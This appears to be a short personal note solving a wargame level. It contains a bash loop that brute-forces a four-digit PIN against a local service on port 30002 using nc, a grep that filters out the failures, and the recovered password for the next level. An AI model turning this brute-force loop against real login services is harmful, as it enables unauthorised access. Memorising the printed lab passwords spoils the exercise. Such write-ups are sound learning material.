
#BlockofKnowledge


```bash
#!/bin/bash
for i in {0000..9999}
do
        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> pinlist.txt
done
cat pinlist.txt | nc localhost 30002 > result.txt
~
```

```bash
grep -vF 'Wrong! Please enter the correct current password and pincode. Try again.' result.txt
```

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```










## Links:
[[level 25]]


Created: 2025-10-04 03:12